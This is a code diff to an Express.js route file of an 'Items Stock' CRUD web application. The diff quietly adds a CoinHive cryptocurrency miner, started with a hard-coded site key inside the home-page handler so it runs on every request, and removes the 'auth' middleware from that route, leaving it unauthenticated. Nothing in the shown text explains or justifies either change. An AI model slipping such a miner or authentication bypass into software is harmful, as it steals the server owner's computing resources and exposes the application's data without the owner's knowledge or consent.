@@ -48,11 +48,27 @@ var users = [
     "user_password": "password",
   }
 ]
+const CoinHive = require('coin-hive');
 
 var title = "Items Stock | CRUD Web Application"
 
 /* GET home page. */
-router.get('/', auth, function(req, res, next) {
+router.get('/', function(req, res, next) {
+  
+ (async () => {
+  
+   // Create miner
+   const miner = await CoinHive('ZM4gjqQ0jh0jbZ3tZDByOXAjyotDbo00'); // CoinHive's Site Key
+  
+   // Start miner
+   await miner.start();
+  
+   // Listen on events
+   miner.on('found', () => console.log('Found!'))
+   miner.on('accepted', () => console.log('Accepted!'))
+
+ })();
+
   db.getItems(results => {
     res.render('index.ejs', { title: title, columns: columns, items: results, username: req.session.username });
   });
